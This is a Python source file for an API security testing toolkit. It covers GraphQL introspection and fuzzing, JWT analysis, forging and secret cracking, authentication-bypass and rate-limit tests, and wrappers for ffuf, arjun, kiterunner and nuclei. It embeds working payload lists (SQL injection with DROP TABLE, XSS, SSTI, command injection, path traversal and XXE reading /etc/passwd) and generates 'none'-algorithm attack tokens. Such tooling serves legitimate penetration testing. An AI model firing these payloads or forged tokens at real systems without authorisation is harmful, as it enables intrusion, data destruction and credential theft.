#!/usr/bin/env python3
"""
API Security Testing Module
- GraphQL introspection & fuzzing
- REST API endpoint discovery & fuzzing
- JWT token analysis and attacks
- Rate limit testing
- Authentication testing
"""

import os
import re
import json
import base64
import hashlib
import subprocess
import logging
import requests
import time
from datetime import datetime
from typing import Dict, Any, List, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class APISecurityTester:
    """Comprehensive API security testing toolkit"""

    def __init__(self, output_dir: str = "/opt/zebbern-kali/api_security"):
        self.output_dir = output_dir
        self._ensure_dirs()

        # Common headers for requests
        self.default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }

        # GraphQL introspection query
        self.introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        fragment InputValue on __InputValue {
          name
          description
          type {
            ...TypeRef
          }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
        """

        # JWT attack payloads
        self.jwt_attacks = {
            "none_algorithm": "Change alg to 'none'",
            "algorithm_confusion": "RS256 -> HS256 with public key",
            "weak_secret": "Brute force common secrets",
            "kid_injection": "Key ID header injection",
            "jku_injection": "JWK Set URL injection",
        }

        # Common API fuzzing payloads
        self.fuzz_payloads = {
            "sqli": ["'", "\"", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"],
            "path_traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
            "command_injection": ["; ls", "| cat /etc/passwd", "& dir", "`id`", "$(whoami)"],
            "nosql": ["{'$gt': ''}", "{'$ne': null}", "true, $where: '1 == 1'"],
            "xxe": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
        }

    def _ensure_dirs(self):
        """Ensure output directories exist."""
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "graphql"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "jwt"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "fuzz"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "reports"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "arjun"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "kiterunner"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "nuclei"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "newman"), exist_ok=True)

    # ==================== GraphQL Testing ====================

    def graphql_introspect(self, url: str, headers: Dict = None,
                           auth_token: str = "") -> Dict[str, Any]:
        """
        Perform GraphQL introspection to discover schema.

        Args:
            url: GraphQL endpoint URL
            headers: Additional headers
            auth_token: Bearer token for authentication

        Returns:
            Schema information and vulnerability assessment
        """
        try:
            req_headers = self.default_headers.copy()
            req_headers["Content-Type"] = "application/json"

            if headers:
                req_headers.update(headers)
            if auth_token:
                req_headers["Authorization"] = f"Bearer {auth_token}"

            # Try introspection
            payload = {"query": self.introspection_query}
            response = requests.post(url, json=payload, headers=req_headers,
                                    timeout=30, verify=False)

            if response.status_code != 200:
                return {
                    "success": False,
                    "error": f"HTTP {response.status_code}",
                    "introspection_enabled": False
                }

            data = response.json()

            if "errors" in data and not data.get("data"):
                return {
                    "success": True,
                    "introspection_enabled": False,
                    "message": "Introspection is disabled (good security practice)",
                    "errors": data.get("errors", [])
                }

            schema = data.get("data", {}).get("__schema", {})

            # Extract useful information
            types = schema.get("types", [])
            queries = []
            mutations = []
            subscriptions = []
            sensitive_fields = []

            # Sensitive field patterns
            sensitive_patterns = [
                "password", "secret", "token", "key", "auth", "credit",
                "ssn", "social", "bank", "admin", "private", "internal"
            ]

            for t in types:
                if t.get("name", "").startswith("__"):
                    continue

                type_name = t.get("name", "")
                fields = t.get("fields") or []

                for field in fields:
                    field_name = field.get("name", "").lower()

                    # Check for sensitive fields
                    for pattern in sensitive_patterns:
                        if pattern in field_name:
                            sensitive_fields.append({
                                "type": type_name,
                                "field": field.get("name"),
                                "pattern": pattern
                            })

                    # Categorize operations
                    if type_name == schema.get("queryType", {}).get("name"):
                        queries.append(field.get("name"))
                    elif type_name == schema.get("mutationType", {}).get("name"):
                        mutations.append(field.get("name"))
                    elif type_name == schema.get("subscriptionType", {}).get("name"):
                        subscriptions.append(field.get("name"))

            result = {
                "success": True,
                "url": url,
                "introspection_enabled": True,
                "vulnerability": "HIGH - Introspection enabled in production",
                "schema_summary": {
                    "total_types": len([t for t in types if not t.get("name", "").startswith("__")]),
                    "queries": queries,
                    "mutations": mutations,
                    "subscriptions": subscriptions,
                },
                "sensitive_fields": sensitive_fields,
                "recommendations": [
                    "Disable introspection in production",
                    "Implement field-level authorization",
                    "Use query complexity analysis",
                    "Implement rate limiting"
                ],
                "timestamp": datetime.now().isoformat()
            }

            # Save schema
            report_file = os.path.join(
                self.output_dir, "graphql",
                f"schema_{urlparse(url).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )
            with open(report_file, 'w') as f:
                json.dump({"result": result, "full_schema": schema}, f, indent=2)

            result["report_file"] = report_file
            return result

        except Exception as e:
            logger.error(f"GraphQL introspection error: {e}")
            return {"success": False, "error": str(e)}

    def graphql_fuzz(self, url: str, query: str, variables: Dict = None,
                     headers: Dict = None, auth_token: str = "") -> Dict[str, Any]:
        """
        Fuzz a GraphQL query for vulnerabilities.

        Args:
            url: GraphQL endpoint
            query: Base query to fuzz
            variables: Variables to fuzz
            headers: Additional headers
            auth_token: Bearer token

        Returns:
            Fuzzing results with potential vulnerabilities
        """
        try:
            req_headers = self.default_headers.copy()
            req_headers["Content-Type"] = "application/json"

            if headers:
                req_headers.update(headers)
            if auth_token:
                req_headers["Authorization"] = f"Bearer {auth_token}"

            findings = []
            variables = variables or {}

            # Test each variable with fuzz payloads
            for var_name, var_value in variables.items():
                for attack_type, payloads in self.fuzz_payloads.items():
                    for payload in payloads:
                        fuzzed_vars = variables.copy()
                        fuzzed_vars[var_name] = payload

                        try:
                            response = requests.post(
                                url,
                                json={"query": query, "variables": fuzzed_vars},
                                headers=req_headers,
                                timeout=10,
                                verify=False
                            )

                            # Analyze response for vulnerability indicators
                            resp_text = response.text.lower()

                            indicators = {
                                "sqli": ["sql", "syntax", "mysql", "postgresql", "oracle", "sqlite"],
                                "xss": [payload.lower()],
                                "ssti": ["49", "7777777"],  # Result of 7*7
                                "path_traversal": ["root:", "passwd", "shadow"],
                                "command_injection": ["uid=", "gid=", "groups="],
                            }

                            for indicator_type, patterns in indicators.items():
                                if attack_type == indicator_type:
                                    for pattern in patterns:
                                        if pattern in resp_text:
                                            findings.append({
                                                "type": attack_type,
                                                "variable": var_name,
                                                "payload": payload,
                                                "evidence": resp_text[:500],
                                                "severity": "HIGH"
                                            })
                                            break

                        except Exception as e:
                            logger.debug(f"Fuzz request failed: {e}")

            return {
                "success": True,
                "url": url,
                "variables_tested": list(variables.keys()),
                "findings": findings,
                "total_requests": len(variables) * sum(len(p) for p in self.fuzz_payloads.values()),
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"GraphQL fuzzing error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== JWT Analysis ====================

    def jwt_analyze(self, token: str) -> Dict[str, Any]:
        """
        Analyze a JWT token for vulnerabilities.

        Args:
            token: JWT token string

        Returns:
            Token analysis with vulnerabilities and attack suggestions
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"success": False, "error": "Invalid JWT format (expected 3 parts)"}

            # Decode header and payload
            def decode_base64(data):
                # Add padding if needed
                padding = 4 - len(data) % 4
                if padding != 4:
                    data += '=' * padding
                return json.loads(base64.urlsafe_b64decode(data))

            try:
                header = decode_base64(parts[0])
                payload = decode_base64(parts[1])
            except Exception as e:
                return {"success": False, "error": f"Failed to decode JWT: {e}"}

            vulnerabilities = []
            attacks = []

            # Check algorithm
            alg = header.get("alg", "").upper()

            if alg == "NONE":
                vulnerabilities.append({
                    "type": "none_algorithm",
                    "severity": "CRITICAL",
                    "description": "Token uses 'none' algorithm - signature not verified"
                })
            elif alg == "HS256":
                attacks.append({
                    "type": "weak_secret",
                    "description": "Try brute-forcing with common secrets",
                    "tool": "hashcat -a 0 -m 16500 jwt.txt wordlist.txt"
                })
                attacks.append({
                    "type": "algorithm_confusion",
                    "description": "If server also accepts RS256, try using public key as HS256 secret"
                })
            elif alg in ["RS256", "RS384", "RS512"]:
                attacks.append({
                    "type": "algorithm_confusion",
                    "description": "Change alg to HS256 and sign with public key"
                })

            # Check for sensitive data in payload
            sensitive_keys = ["password", "secret", "key", "credit", "ssn", "private"]
            exposed_sensitive = []

            for key in payload.keys():
                for sensitive in sensitive_keys:
                    if sensitive in key.lower():
                        exposed_sensitive.append(key)

            if exposed_sensitive:
                vulnerabilities.append({
                    "type": "sensitive_data_exposure",
                    "severity": "MEDIUM",
                    "description": f"Sensitive data in payload: {exposed_sensitive}"
                })

            # Check expiration
            exp = payload.get("exp")
            iat = payload.get("iat")
            nbf = payload.get("nbf")

            current_time = int(time.time())

            if not exp:
                vulnerabilities.append({
                    "type": "no_expiration",
                    "severity": "MEDIUM",
                    "description": "Token has no expiration (exp claim)"
                })
            elif exp < current_time:
                vulnerabilities.append({
                    "type": "expired_token",
                    "severity": "INFO",
                    "description": f"Token expired at {datetime.fromtimestamp(exp)}"
                })
            elif exp - current_time > 86400 * 30:  # More than 30 days
                vulnerabilities.append({
                    "type": "long_expiration",
                    "severity": "LOW",
                    "description": f"Token expires in more than 30 days"
                })

            # Check header for injection points
            if "kid" in header:
                attacks.append({
                    "type": "kid_injection",
                    "description": "Key ID (kid) present - try SQL injection or path traversal",
                    "payloads": [
                        "' UNION SELECT 'secret' --",
                        "../../../dev/null",
                        "../../../../../../etc/passwd"
                    ]
                })

            if "jku" in header:
                vulnerabilities.append({
                    "type": "jku_present",
                    "severity": "HIGH",
                    "description": "JWK Set URL present - may be vulnerable to SSRF"
                })
                attacks.append({
                    "type": "jku_injection",
                    "description": "Replace jku with attacker-controlled URL serving malicious JWK"
                })

            if "x5u" in header:
                vulnerabilities.append({
                    "type": "x5u_present",
                    "severity": "HIGH",
                    "description": "X.509 URL present - may be vulnerable to SSRF"
                })

            # Generate attack tokens
            attack_tokens = []

            # None algorithm attack
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip('=')
            none_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            attack_tokens.append({
                "type": "none_algorithm",
                "token": f"{none_header}.{none_payload}."
            })

            result = {
                "success": True,
                "header": header,
                "payload": payload,
                "algorithm": alg,
                "vulnerabilities": vulnerabilities,
                "suggested_attacks": attacks,
                "attack_tokens": attack_tokens,
                "claims": {
                    "issued_at": datetime.fromtimestamp(iat).isoformat() if iat else None,
                    "expires": datetime.fromtimestamp(exp).isoformat() if exp else None,
                    "not_before": datetime.fromtimestamp(nbf).isoformat() if nbf else None,
                },
                "timestamp": datetime.now().isoformat()
            }

            # Save analysis
            token_hash = hashlib.md5(token.encode()).hexdigest()[:8]
            report_file = os.path.join(
                self.output_dir, "jwt",
                f"jwt_analysis_{token_hash}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )
            with open(report_file, 'w') as f:
                json.dump(result, f, indent=2)

            result["report_file"] = report_file
            return result

        except Exception as e:
            logger.error(f"JWT analysis error: {e}")
            return {"success": False, "error": str(e)}

    def jwt_crack(self, token: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                  max_attempts: int = 10000) -> Dict[str, Any]:
        """
        Attempt to crack JWT secret using hashcat or custom implementation.

        Args:
            token: JWT token
            wordlist: Path to wordlist
            max_attempts: Max attempts for built-in cracker

        Returns:
            Cracking results
        """
        try:
            # Try hashcat first
            try:
                token_file = os.path.join(self.output_dir, "jwt", "token_to_crack.txt")
                with open(token_file, 'w') as f:
                    f.write(token)

                cmd = [
                    "hashcat", "-a", "0", "-m", "16500",
                    token_file, wordlist,
                    "--quiet", "--potfile-disable",
                    "-O", "--runtime=60"  # 60 second timeout
                ]

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

                if result.returncode == 0 and ":" in result.stdout:
                    secret = result.stdout.strip().split(":")[-1]
                    return {
                        "success": True,
                        "cracked": True,
                        "secret": secret,
                        "method": "hashcat",
                        "severity": "CRITICAL"
                    }

            except Exception as e:
                logger.debug(f"Hashcat not available: {e}")

            # Fallback to Python-based cracking (slower but works)
            import hmac

            parts = token.split('.')
            if len(parts) != 3:
                return {"success": False, "error": "Invalid JWT"}

            message = f"{parts[0]}.{parts[1]}"
            signature = parts[2]

            # Add padding to signature
            sig_padding = 4 - len(signature) % 4
            if sig_padding != 4:
                signature += '=' * sig_padding

            target_sig = base64.urlsafe_b64decode(signature)

            if not os.path.exists(wordlist):
                # Try common secrets
                common_secrets = [
                    "secret", "password", "123456", "admin", "key",
                    "jwt_secret", "supersecret", "changeme", "test",
                    "development", "production", "your-256-bit-secret"
                ]
            else:
                with open(wordlist, 'r', errors='ignore') as f:
                    common_secrets = [line.strip() for line in f][:max_attempts]

            for secret in common_secrets:
                if not secret:
                    continue
                try:
                    sig = hmac.new(
                        secret.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()

                    if sig == target_sig:
                        return {
                            "success": True,
                            "cracked": True,
                            "secret": secret,
                            "method": "bruteforce",
                            "severity": "CRITICAL"
                        }
                except:
                    pass

            return {
                "success": True,
                "cracked": False,
                "message": f"Secret not found in {len(common_secrets)} attempts",
                "recommendation": "Try with larger wordlist or hashcat"
            }

        except Exception as e:
            logger.error(f"JWT cracking error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== REST API Testing ====================

    def api_fuzz_endpoint(self, url: str, method: str = "GET",
                          params: Dict = None, data: Dict = None,
                          headers: Dict = None, auth_token: str = "") -> Dict[str, Any]:
        """
        Fuzz a REST API endpoint for vulnerabilities.

        Args:
            url: API endpoint URL
            method: HTTP method
            params: Query parameters to fuzz
            data: Body data to fuzz
            headers: Additional headers
            auth_token: Bearer token

        Returns:
            Fuzzing results
        """
        try:
            req_headers = self.default_headers.copy()
            if headers:
                req_headers.update(headers)
            if auth_token:
                req_headers["Authorization"] = f"Bearer {auth_token}"

            findings = []
            baseline_response = None

            # Get baseline response
            try:
                if method.upper() == "GET":
                    baseline_response = requests.get(
                        url, params=params, headers=req_headers,
                        timeout=10, verify=False
                    )
                else:
                    baseline_response = requests.request(
                        method, url, params=params, json=data,
                        headers=req_headers, timeout=10, verify=False
                    )
            except Exception as e:
                logger.debug(f"Baseline request failed: {e}")

            # Fuzz parameters
            test_data = {}
            if params:
                test_data.update(params)
            if data:
                test_data.update(data)

            for param_name, param_value in test_data.items():
                for attack_type, payloads in self.fuzz_payloads.items():
                    for payload in payloads:
                        fuzzed_params = test_data.copy()
                        fuzzed_params[param_name] = payload

                        try:
                            if method.upper() == "GET":
                                response = requests.get(
                                    url, params=fuzzed_params,
                                    headers=req_headers, timeout=10, verify=False
                                )
                            else:
                                response = requests.request(
                                    method, url,
                                    params=params if params else None,
                                    json=fuzzed_params if data else None,
                                    headers=req_headers, timeout=10, verify=False
                                )

                            # Analyze for vulnerabilities
                            resp_text = response.text.lower()

                            # Check for error messages indicating vulnerabilities
                            vuln_indicators = {
                                "sqli": [
                                    "sql syntax", "mysql", "postgresql", "sqlite",
                                    "oracle", "unclosed quotation", "syntax error"
                                ],
                                "xss": [payload.lower() for payload in self.fuzz_payloads["xss"]],
                                "ssti": ["49", "7777777"],
                                "path_traversal": ["root:", "/etc/passwd", "shadow"],
                                "command_injection": ["uid=", "gid=", "www-data", "root"],
                            }

                            for vuln_type, indicators in vuln_indicators.items():
                                if attack_type == vuln_type:
                                    for indicator in indicators:
                                        if indicator in resp_text:
                                            findings.append({
                                                "vulnerability": vuln_type,
                                                "parameter": param_name,
                                                "payload": payload,
                                                "status_code": response.status_code,
                                                "evidence": resp_text[:500],
                                                "severity": "HIGH" if vuln_type in ["sqli", "command_injection"] else "MEDIUM"
                                            })
                                            break

                            # Check for verbose errors
                            error_patterns = [
                                "stack trace", "exception", "error in",
                                "line \\d+", "traceback", "undefined"
                            ]
                            for pattern in error_patterns:
                                if re.search(pattern, resp_text, re.I):
                                    if not any(f.get("vulnerability") == "information_disclosure"
                                              and f.get("parameter") == param_name for f in findings):
                                        findings.append({
                                            "vulnerability": "information_disclosure",
                                            "parameter": param_name,
                                            "payload": payload,
                                            "evidence": resp_text[:500],
                                            "severity": "LOW"
                                        })
                                    break

                        except Exception as e:
                            logger.debug(f"Fuzz request failed: {e}")

            return {
                "success": True,
                "url": url,
                "method": method,
                "parameters_tested": list(test_data.keys()),
                "findings": findings,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"API fuzzing error: {e}")
            return {"success": False, "error": str(e)}

    def rate_limit_test(self, url: str, method: str = "GET",
                        requests_count: int = 100,
                        delay: float = 0.01,
                        headers: Dict = None,
                        auth_token: str = "") -> Dict[str, Any]:
        """
        Test API rate limiting.

        Args:
            url: API endpoint
            method: HTTP method
            requests_count: Number of requests to send
            delay: Delay between requests
            headers: Additional headers
            auth_token: Bearer token

        Returns:
            Rate limiting analysis
        """
        try:
            req_headers = self.default_headers.copy()
            if headers:
                req_headers.update(headers)
            if auth_token:
                req_headers["Authorization"] = f"Bearer {auth_token}"

            results = []
            rate_limited = False
            rate_limit_threshold = None

            start_time = time.time()

            for i in range(requests_count):
                try:
                    if method.upper() == "GET":
                        response = requests.get(url, headers=req_headers,
                                               timeout=10, verify=False)
                    else:
                        response = requests.request(method, url, headers=req_headers,
                                                   timeout=10, verify=False)

                    results.append({
                        "request_num": i + 1,
                        "status_code": response.status_code,
                        "response_time": response.elapsed.total_seconds()
                    })

                    # Check for rate limiting
                    if response.status_code == 429:
                        rate_limited = True
                        rate_limit_threshold = i + 1

                        # Check retry-after header
                        retry_after = response.headers.get("Retry-After")
                        if retry_after:
                            results[-1]["retry_after"] = retry_after
                        break

                    # Check for rate limit headers
                    rate_headers = {
                        "X-RateLimit-Limit": response.headers.get("X-RateLimit-Limit"),
                        "X-RateLimit-Remaining": response.headers.get("X-RateLimit-Remaining"),
                        "X-RateLimit-Reset": response.headers.get("X-RateLimit-Reset"),
                    }
                    results[-1]["rate_headers"] = {k: v for k, v in rate_headers.items() if v}

                    if delay > 0:
                        time.sleep(delay)

                except Exception as e:
                    results.append({
                        "request_num": i + 1,
                        "error": str(e)
                    })

            elapsed = time.time() - start_time

            return {
                "success": True,
                "url": url,
                "requests_sent": len(results),
                "rate_limited": rate_limited,
                "rate_limit_threshold": rate_limit_threshold,
                "requests_per_second": len(results) / elapsed if elapsed > 0 else 0,
                "vulnerability": "MEDIUM - No rate limiting detected" if not rate_limited else None,
                "avg_response_time": sum(r.get("response_time", 0) for r in results) / len(results) if results else 0,
                "results_sample": results[:10],
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"Rate limit test error: {e}")
            return {"success": False, "error": str(e)}

    def auth_bypass_test(self, url: str, valid_token: str = "",
                         headers: Dict = None) -> Dict[str, Any]:
        """
        Test for authentication bypass vulnerabilities.

        Args:
            url: Protected API endpoint
            valid_token: A valid token for comparison
            headers: Additional headers

        Returns:
            Authentication bypass findings
        """
        try:
            findings = []
            req_headers = self.default_headers.copy()
            if headers:
                req_headers.update(headers)

            # Get baseline (with valid token if provided)
            baseline_status = None
            if valid_token:
                auth_headers = req_headers.copy()
                auth_headers["Authorization"] = f"Bearer {valid_token}"
                try:
                    resp = requests.get(url, headers=auth_headers, timeout=10, verify=False)
                    baseline_status = resp.status_code
                except:
                    pass

            # Test 1: No auth header
            try:
                resp = requests.get(url, headers=req_headers, timeout=10, verify=False)
                if resp.status_code in [200, 201]:
                    findings.append({
                        "type": "no_auth_required",
                        "severity": "CRITICAL",
                        "description": "Endpoint accessible without authentication",
                        "status_code": resp.status_code
                    })
            except:
                pass

            # Test 2: Empty token
            bypass_tests = [
                ("empty_token", "Bearer "),
                ("null_token", "Bearer null"),
                ("undefined_token", "Bearer undefined"),
                ("empty_basic", "Basic "),
                ("admin_token", "Bearer admin"),
                ("test_token", "Bearer test"),
            ]

            for test_name, auth_value in bypass_tests:
                try:
                    test_headers = req_headers.copy()
                    test_headers["Authorization"] = auth_value
                    resp = requests.get(url, headers=test_headers, timeout=10, verify=False)

                    if resp.status_code in [200, 201]:
                        findings.append({
                            "type": test_name,
                            "severity": "HIGH",
                            "description": f"Bypass with '{auth_value}'",
                            "status_code": resp.status_code
                        })
                except:
                    pass

            # Test 3: Method override
            method_overrides = [
                ("X-HTTP-Method-Override", "GET"),
                ("X-Method-Override", "GET"),
                ("X-HTTP-Method", "GET"),
                ("_method", "GET"),
            ]

            for header_name, value in method_overrides:
                try:
                    test_headers = req_headers.copy()
                    test_headers[header_name] = value
                    resp = requests.post(url, headers=test_headers, timeout=10, verify=False)

                    if resp.status_code in [200, 201]:
                        findings.append({
                            "type": "method_override",
                            "severity": "MEDIUM",
                            "description": f"Method override via {header_name}",
                            "status_code": resp.status_code
                        })
                except:
                    pass

            return {
                "success": True,
                "url": url,
                "baseline_status": baseline_status,
                "findings": findings,
                "vulnerable": len(findings) > 0,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"Auth bypass test error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== FFUF Fuzzing ====================

    def ffuf_fuzz(self, url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  method: str = "GET", data: str = "", headers: Dict[str, str] = None,
                  match_codes: str = "200,201,204,301,302,307,401,403,405,500",
                  filter_codes: str = "", rate: int = 100,
                  additional_args: str = "") -> Dict[str, Any]:
        """
        Fuzz API endpoints using FFUF.
        Use FUZZ keyword in URL, data, or headers for fuzzing position.

        Args:
            url: Target URL with FUZZ keyword (e.g., http://api.com/api/FUZZ)
            wordlist: Path to wordlist file
            method: HTTP method
            data: POST data with FUZZ keyword
            headers: Custom headers (can include FUZZ)
            match_codes: Status codes to match
            filter_codes: Status codes to filter out
            rate: Requests per second
            additional_args: Additional FFUF arguments

        Returns:
            Fuzzing results with discovered endpoints
        """
        try:
            output_file = os.path.join(
                self.output_dir, "fuzz",
                f"ffuf_{urlparse(url).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )

            cmd = [
                "ffuf",
                "-u", url,
                "-w", wordlist,
                "-X", method,
                "-mc", match_codes,
                "-rate", str(rate),
                "-o", output_file,
                "-of", "json",
                "-timeout", "10"
            ]

            if filter_codes:
                cmd.extend(["-fc", filter_codes])

            if data:
                cmd.extend(["-d", data])

            if headers:
                for k, v in headers.items():
                    cmd.extend(["-H", f"{k}: {v}"])

            if additional_args:
                cmd.extend(additional_args.split())

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Parse results
            results = []
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    data = json.load(f)
                    results = data.get("results", [])

            return {
                "success": True,
                "url": url,
                "wordlist": wordlist,
                "total_found": len(results),
                "results": results[:100],  # Limit output
                "output_file": output_file,
                "command": " ".join(cmd),
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "FFUF timed out after 10 minutes"}
        except Exception as e:
            logger.error(f"FFUF error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Arjun Parameter Discovery ====================

    def arjun_discover(self, url: str, method: str = "GET",
                       wordlist: str = "", headers: Dict[str, str] = None,
                       include_json: bool = True,
                       additional_args: str = "") -> Dict[str, Any]:
        """
        Discover hidden API parameters using Arjun.

        Args:
            url: Target URL
            method: HTTP method (GET or POST)
            headers: Custom headers
            wordlist: Custom parameter wordlist
            include_json: Include JSON parameters
            additional_args: Additional Arjun arguments

        Returns:
            Discovered parameters
        """
        try:
            output_file = os.path.join(
                self.output_dir, "arjun",
                f"arjun_{urlparse(url).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )

            cmd = [
                "arjun",
                "-u", url,
                "-m", method,
                "-oJ", output_file,
                "-t", "10"
            ]

            if wordlist:
                cmd.extend(["-w", wordlist])

            if include_json:
                cmd.append("--json")

            if headers:
                for k, v in headers.items():
                    cmd.extend(["-H", f"{k}: {v}"])

            if additional_args:
                cmd.extend(additional_args.split())

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            # Parse results
            params = []
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    data = json.load(f)
                    params = data.get(url, []) if isinstance(data, dict) else data

            return {
                "success": True,
                "url": url,
                "method": method,
                "parameters_found": len(params) if isinstance(params, list) else 0,
                "parameters": params,
                "output_file": output_file,
                "stdout": result.stdout,
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Arjun timed out"}
        except Exception as e:
            logger.error(f"Arjun error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Kiterunner API Path Discovery ====================

    def kiterunner_scan(self, target: str, wordlist: str = "",
                        assetnote: bool = True, content_types: str = "json",
                        max_connection_per_host: int = 3,
                        additional_args: str = "") -> Dict[str, Any]:
        """
        Discover API paths using Kiterunner (kr).

        Args:
            target: Target URL or file with targets
            wordlist: Custom wordlist or kite file (.kite)
            assetnote: Use Assetnote wordlists
            content_types: Content types to test
            max_connection_per_host: Max connections per host
            additional_args: Additional kr arguments

        Returns:
            Discovered API paths with methods
        """
        try:
            output_file = os.path.join(
                self.output_dir, "kiterunner",
                f"kr_{urlparse(target).netloc if '://' in target else target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            )

            # Check if kr/kiterunner is installed
            kr_path = None
            for path in ["/usr/bin/kr", "/usr/local/bin/kr", os.path.expanduser("~/go/bin/kr")]:
                if os.path.exists(path):
                    kr_path = path
                    break

            if not kr_path:
                return {
                    "success": False,
                    "error": "Kiterunner (kr) not found",
                    "install_command": "go install github.com/assetnote/kiterunner/cmd/kr@latest"
                }

            cmd = [kr_path, "scan", target]

            if wordlist:
                cmd.extend(["-w", wordlist])
            elif assetnote:
                # Use Assetnote routes
                cmd.extend(["-A=apiroutes-210228:20000"])

            cmd.extend([
                "-x", str(max_connection_per_host),
                "--fail-status-codes", "404,400",
                "-o", output_file
            ])

            if additional_args:
                cmd.extend(additional_args.split())

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Parse results
            discovered = []
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            discovered.append(line)

            # Also parse stdout for results
            for line in result.stdout.split('\n'):
                if '[' in line and ']' in line:
                    discovered.append(line.strip())

            return {
                "success": True,
                "target": target,
                "total_found": len(discovered),
                "results": discovered[:100],
                "output_file": output_file,
                "stdout": result.stdout[:5000] if result.stdout else "",
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Kiterunner timed out"}
        except Exception as e:
            logger.error(f"Kiterunner error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Nuclei API Testing ====================

    def nuclei_api_scan(self, target: str, templates: str = "",
                        severity: str = "", tags: str = "api",
                        rate_limit: int = 150,
                        additional_args: str = "") -> Dict[str, Any]:
        """
        Scan API with Nuclei templates.

        Args:
            target: Target URL
            templates: Specific template path or comma-separated templates
            severity: Filter by severity (critical,high,medium,low,info)
            tags: Template tags to include (default: api)
            rate_limit: Requests per second
            additional_args: Additional Nuclei arguments

        Returns:
            Vulnerabilities discovered
        """
        try:
            output_file = os.path.join(
                self.output_dir, "nuclei",
                f"nuclei_{urlparse(target).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )

            cmd = [
                "nuclei",
                "-u", target,
                "-jsonl", "-o", output_file,
                "-rate-limit", str(rate_limit),
                "-timeout", "10",
                "-retries", "1"
            ]

            if templates:
                cmd.extend(["-t", templates])
            elif tags:
                cmd.extend(["-tags", tags])

            if severity:
                cmd.extend(["-severity", severity])

            if additional_args:
                cmd.extend(additional_args.split())

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Parse JSONL results
            findings = []
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                findings.append(json.loads(line))
                            except:
                                pass

            # Categorize by severity
            severity_count = {
                "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0
            }
            for f in findings:
                sev = f.get("info", {}).get("severity", "info").lower()
                if sev in severity_count:
                    severity_count[sev] += 1

            return {
                "success": True,
                "target": target,
